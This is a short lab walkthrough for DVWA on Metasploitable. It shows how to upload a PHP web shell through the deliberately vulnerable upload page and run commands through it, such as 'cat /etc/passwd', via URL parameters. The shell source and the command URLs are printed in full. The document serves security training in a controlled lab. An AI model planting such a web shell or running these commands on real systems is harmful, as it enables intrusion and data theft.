Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main 
goal is to be an aid for security professionals to test their skills and tools in a legal environment, 
help web developers better understand the processes of securing web applications and to aid both students 
& teachers to learn about web application security in a controlled class room environment.

The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of 
difficulty, with a simple straightforward interface. Please note, there are both documented and 
undocumented vulnerabilities with this software. This is intentional. You are encouraged to try and 
discover as many issues as possible.

See official site: https://github.com/digininja/DVWA

-> Launch and configure DVWA
Start Metasploitable.
From Kali, open http://http://<metasploitable ip>/dvwa/login.php
  user: admin
  password: password

You will have acces to all the admin DVWA site. You can configure it as you want:
  -Database creation.
  -Level of security.

-> An example
Here, we would like to test script injection by upload.
1. Put the site in low security.
  Go to DVWA Security and submit "Low".
  Go to Upload and upload the shell.php file (see resouces):
  --- shell.php ---
  <?php
  if (isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
  }
  ?>
  ---

2. Once the file is uploaded, you will see the its location. Here ../../hackable/uploads/shell.php.

3. Go to the shell.
Open http://http://<metasploitable ip>/dvwa/upload/../../hackable/uploads/shell.php

4. Then launch commands.
Just add it at the end of the URL:
  http://http://<metasploitable ip>/dvwa/hackable/uploads/shell.php?cmd=pwd
  http://http://<metasploitable ip>/dvwa/hackable/uploads/shell.php?cmd=ps -ef
  http://http://<metasploitable ip>/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd

-> Prevention
After playing with intrusions/menus and security levels, you can see the source and compare.
